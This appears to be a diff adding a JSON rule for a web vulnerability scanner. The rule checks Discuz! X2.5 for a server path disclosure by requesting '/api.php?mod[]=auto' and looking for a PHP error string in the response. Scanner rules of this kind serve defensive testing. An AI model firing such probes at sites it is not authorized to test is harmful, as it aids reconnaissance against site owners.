@@ -1,0 +1,23 @@
+{
+    "target":"discuz",
+    "meta":{
+        "name":    "Discuz! X2.5 /api.php 网站物理路径泄露",
+        "remarks": "Discuz! X2.5 /api.php 网站物理路径泄露",
+        "level":   4,
+        "type":    "信息泄漏",
+        "author":   "wolf",
+        "references": {
+            "url":"",
+            "cve":"",
+            "kpid":"KP-0045"
+        }
+    },
+    "request":{
+        "path":     "/api.php?mod[]=auto",
+        "postData": ""
+    },
+    "verify":{
+        "type":  "string",
+        "match": ".php on line"
+    }
+}
